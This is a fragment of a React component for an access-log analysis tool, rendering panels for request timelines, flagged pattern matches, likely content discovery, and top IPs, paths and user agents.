                                      className={`absolute inset-y-0 left-0 rounded-full ${tone}`}
                                      style={{ width: `${Math.max(1, (s.count / summary.requests) * 100)}%` }}
                                    />
                                  </div>
                                  <span className="w-14 text-right font-mono-tight text-xs tabular-nums text-[hsl(var(--brand-bone-dim))]">
                                    {share(s.count, summary.requests)}
                                  </span>
                                </div>
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  </div>
                )}
              </ToolPanel>
            </div>

            {tl ? (
              <ToolPanel title="Requests over time">
                <p className="mb-4 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
                  One bar per {stepLabel(tl.bucketMs)}, at {offsetLabel(tl.offsetMin)}, the offset written in the first line.
                  {tl.mixedOffsets
                    ? " The log changes offset partway through (a daylight saving switch, or merged servers), so later lines are shown at the first line's offset."
                    : ""}
                </p>
                <TimelineChart key={`${tl.bucketMs}:${tl.buckets.length}:${tl.buckets[0].start}`} timeline={tl} />
                <details className="mt-4">
                  <summary className="cursor-pointer py-3 font-mono-tight text-xs uppercase tracking-[0.2em] text-[hsl(var(--brand-bone-dim))]">
                    Show the counts as a table
                  </summary>
                  <div className="mt-2 max-h-80 overflow-auto">
                    <table className="w-full min-w-[420px] border-collapse text-left">
                      <thead>
                        <tr className="border-b border-[hsl(var(--brand-iron))]">
                          <th scope="col" className={TH_CLASS}>Start</th>
                          <th scope="col" className={`${TH_CLASS} text-right`}>Total</th>
                          <th scope="col" className={`${TH_CLASS} text-right`}>1xx-3xx</th>
                          <th scope="col" className={`${TH_CLASS} text-right`}>4xx</th>
                          <th scope="col" className={`${TH_CLASS} text-right`}>5xx</th>
                        </tr>
                      </thead>
                      <tbody>
                        {tl.buckets.map((b) => (
                          <tr key={b.start} className="border-b border-[hsl(var(--brand-iron)/0.5)]">
                            <th scope="row" className="py-2 pr-4 text-left font-mono-tight text-xs font-normal text-[hsl(var(--brand-bone))]">
                              {formatAtOffset(b.start, tl.offsetMin)}
                            </th>
                            <td className={TD_NUM}>{b.total.toLocaleString("en-US")}</td>
                            <td className={TD_NUM}>{b.ok.toLocaleString("en-US")}</td>
                            <td className={TD_NUM}>{b.client.toLocaleString("en-US")}</td>
                            <td className={TD_NUM}>{b.server.toLocaleString("en-US")}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </details>
              </ToolPanel>
            ) : null}

            <ToolPanel title="Findings">
              <p className="mb-4 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
                Pattern matches on decoded fields. A match shows what a request attempted, not that it worked: read the status
                code beside each one. Choose a finding to filter every panel to it.
              </p>
              <ul className="grid grid-cols-1 gap-2 md:grid-cols-2" data-testid="list-rule-counts">
                {RULES.map((rule) => {
                  const count = summary.ruleCounts[rule.id];
                  const on = flagFilter === rule.id;
                  return (
                    <li key={rule.id}>
                      <button
                        type="button"
                        aria-pressed={on}
                        onClick={() => {
                          setFlagFilter(on ? "all" : rule.id);
                          setFlaggedLimit(FLAGGED_PAGE);
                        }}
                        className={`flex min-h-[44px] w-full flex-col items-start gap-1 rounded-lg border p-3 text-left transition-colors focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))] ${
                          on
                            ? "border-[hsl(var(--brand-signal))] bg-[hsl(var(--brand-signal)/0.1)]"
                            : "border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.4)] hover:border-[hsl(var(--brand-signal)/0.5)]"
                        } ${count === 0 && !on ? "opacity-60" : ""}`}
                      >
                        <span className="flex w-full flex-wrap items-center justify-between gap-2">
                          <span className="font-mono-tight text-sm text-[hsl(var(--brand-bone))]">{rule.label}</span>
                          <span className="flex items-center gap-2">
                            <span className={`rounded-full border px-2 py-0.5 font-mono-tight text-[0.625rem] uppercase tracking-[0.18em] ${SEVERITY_STYLE[rule.severity]}`}>
                              {rule.severity}
                            </span>
                            <span className="font-mono-tight text-sm tabular-nums text-[hsl(var(--brand-bone))]">
                              {count.toLocaleString("en-US")}
                            </span>
                          </span>
                        </span>
                        <span className="font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">{rule.summary}</span>
                      </button>
                    </li>
                  );
                })}
              </ul>

              <h3 className={`${LABEL} mt-6`}>Likely content discovery</h3>
              {summary.discovery.length === 0 ? (
                <p className="mt-2 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-ash))]">
                  No IP has {DISCOVERY_MIN_404} or more 404 responses making up at least {Math.round(DISCOVERY_MIN_SHARE * 100)}% of
                  its requests.
                </p>
              ) : (
                <ul className="mt-2 space-y-1" data-testid="list-discovery">
                  {summary.discovery.map((r) => (
                    <li key={r.ip} className="font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
                      <span className="break-all text-[hsl(var(--brand-signal))]">{r.ip}</span>: {r.notFound.toLocaleString("en-US")}{" "}
                      of {r.requests.toLocaleString("en-US")} requests returned 404, the pattern a wordlist tool such as gobuster,
                      ffuf or dirb leaves.
                    </li>
                  ))}
                </ul>
              )}

              {summary.flaggedIps.length ? (
                <div className="mt-6 flex flex-wrap items-center gap-3">
                  <CopyButton
                    value={summary.flaggedIps.join("\n")}
                    label="Copy the flagged IP addresses, one per line"
                    testId="button-copy-flagged-ips"
                  >
                    Copy {summary.flaggedIps.length.toLocaleString("en-US")} flagged {pluralise(summary.flaggedIps.length, "IP")}
                  </CopyButton>
                  <span className="font-mono-tight text-xs text-[hsl(var(--brand-ash))]">One per line, most flagged first.</span>
                </div>
              ) : null}
            </ToolPanel>

            <ToolPanel title="Top IP addresses">
              <div className="overflow-x-auto">
                <table className="w-full min-w-[620px] border-collapse text-left" data-testid="table-top-ips">
                  <thead>
                    <tr className="border-b border-[hsl(var(--brand-iron))]">
                      <th scope="col" className={TH_CLASS}>IP</th>
                      <th scope="col" className={`${TH_CLASS} text-right`}>Requests</th>
                      <th scope="col" className={`${TH_CLASS} text-right`}>4xx</th>
                      <th scope="col" className={`${TH_CLASS} text-right`}>404</th>
                      <th scope="col" className={`${TH_CLASS} text-right`}>5xx</th>
                      <th scope="col" className={`${TH_CLASS} text-right`}>Flagged</th>
                      <th scope="col" className={`${TH_CLASS} text-right`}>Bytes</th>
                    </tr>
                  </thead>
                  <tbody>
                    {summary.topIps.map((r) => (
                      <tr key={r.ip} className="border-b border-[hsl(var(--brand-iron)/0.5)]">
                        <th scope="row" className="py-1 pr-4 text-left font-normal">
                          <button
                            type="button"
                            onClick={() => {
                              setIpFilter(ipFilter.trim() === r.ip ? "" : r.ip);
                              setFlaggedLimit(FLAGGED_PAGE);
                            }}
                            title="Filter to this address"
                            className="min-h-[32px] break-all py-1 text-left font-mono-tight text-sm text-[hsl(var(--brand-signal))] underline-offset-4 hover:underline focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))]"
                          >
                            {r.ip}
                          </button>
                        </th>
                        <td className={TD_NUM}>{r.requests.toLocaleString("en-US")}</td>
                        <td className={TD_NUM}>{r.client.toLocaleString("en-US")}</td>
                        <td className={TD_NUM}>{r.notFound.toLocaleString("en-US")}</td>
                        <td className={TD_NUM}>{r.server.toLocaleString("en-US")}</td>
                        <td className={`${TD_NUM} ${r.flagged ? "text-[hsl(var(--brand-danger))]" : ""}`}>{r.flagged.toLocaleString("en-US")}</td>
                        <td className={TD_NUM}>{formatBytes(r.bytes)}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </ToolPanel>

            <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
              <ToolPanel title="Top paths">
                <p className="mb-3 font-mono-tight text-xs text-[hsl(var(--brand-ash))]">Query strings removed, so /item?id=1 and /item?id=2 count together.</p>
                <div className="overflow-x-auto">
                  <table className="w-full min-w-[360px] border-collapse text-left" data-testid="table-top-paths">
                    <thead>
                      <tr className="border-b border-[hsl(var(--brand-iron))]">
                        <th scope="col" className={TH_CLASS}>Path</th>
                        <th scope="col" className={`${TH_CLASS} text-right`}>Requests</th>
                        <th scope="col" className={`${TH_CLASS} text-right`}>Errors</th>
                        <th scope="col" className={`${TH_CLASS} text-right`}>Flagged</th>
                      </tr>
                    </thead>
                    <tbody>
                      {summary.topPaths.map((r) => (
                        <tr key={r.path} className="border-b border-[hsl(var(--brand-iron)/0.5)] align-top">
                          <th scope="row" className="max-w-[260px] break-all py-2 pr-4 text-left font-mono-tight text-xs font-normal text-[hsl(var(--brand-bone))]">
                            {r.path}
                          </th>
                          <td className={TD_NUM}>{r.requests.toLocaleString("en-US")}</td>
                          <td className={TD_NUM}>{r.errors.toLocaleString("en-US")}</td>
                          <td className={`${TD_NUM} ${r.flagged ? "text-[hsl(var(--brand-danger))]" : ""}`}>{r.flagged.toLocaleString("en-US")}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </ToolPanel>

              <ToolPanel title="Top user agents">
                {!summary.agentsLogged ? (
                  <p className="font-mono-tight text-sm leading-relaxed text-[hsl(var(--brand-ash))]">
                    These lines are in common format, which has no user agent field. Combined format adds it.
                  </p>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full min-w-[320px] border-collapse text-left" data-testid="table-top-agents">
                      <thead>
                        <tr className="border-b border-[hsl(var(--brand-iron))]">
                          <th scope="col" className={TH_CLASS}>User agent</th>
                          <th scope="col" className={`${TH_CLASS} text-right`}>Requests</th>
                        </tr>
                      </thead>
                      <tbody>
                        {summary.topAgents.map((r) => (
                          <tr key={r.key} className="border-b border-[hsl(var(--brand-iron)/0.5)] align-top">
                            <th scope="row" className="max-w-[320px] break-all py-2 pr-4 text-left font-mono-tight text-xs font-normal text-[hsl(var(--brand-bone))]">
                              {r.key}
                            </th>
                            <td className={TD_NUM}>{r.count.toLocaleString("en-US")}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </ToolPanel>
            </div>

            <ToolPanel title="Flagged requests">
              {flagged.length === 0 ? (
                <p className="font-mono-tight text-sm text-[hsl(var(--brand-ash))]" data-testid="text-no-flagged">
                  No request in the current selection matched a pattern.
                </p>
              ) : (
                <>
                  <p className="mb-3 font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
                    Showing {Math.min(flaggedLimit, flagged.length).toLocaleString("en-US")} of{" "}
                    {flagged.length.toLocaleString("en-US")}, in file order. Requests appear as logged, with the server's own escapes.
                  </p>
                  <ol className="space-y-2" data-testid="list-flagged">
                    {flagged.slice(0, flaggedLimit).map((e) => (
                      <FlaggedRow key={e.line} entry={e} />
                    ))}
                  </ol>
                  {flagged.length > flaggedLimit ? (
                    <button
                      type="button"
                      onClick={() => setFlaggedLimit((n) => n + FLAGGED_PAGE * 2)}
                      className={`${CHIP_CLASS} mt-4`}
                    >
                      Show {Math.min(FLAGGED_PAGE * 2, flagged.length - flaggedLimit).toLocaleString("en-US")} more
                    </button>
                  ) : null}
                </>
              )}
            </ToolPanel>
          </>
        ) : null}

        {parsed.unparsedCount > 0 ? (
          <ToolPanel title="Unparsed lines">
            <p className="mb-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
              {parsed.unparsedCount.toLocaleString("en-US")} {pluralise(parsed.unparsedCount, "line")} did not match the common or
              combined layout{parsed.unparsedCount > parsed.unparsed.length ? `. The first ${parsed.unparsed.length} are shown` : ""}.
              A custom LogFormat, a JSON log, or an error log will not parse here.
            </p>
            <ol className="space-y-2" data-testid="list-unparsed">
              {parsed.unparsed.map((u) => (
                <li key={u.line} className="rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.5)] p-3">
                  <p className="font-mono-tight text-xs text-[hsl(var(--brand-amber))]">
                    Line {u.line.toLocaleString("en-US")}: {u.reason}
                  </p>
                  <p className="mt-1 break-all font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">{u.text}</p>
                </li>
              ))}
            </ol>
          </ToolPanel>
        ) : null}
      </div>
    </ToolShell>
  );
}
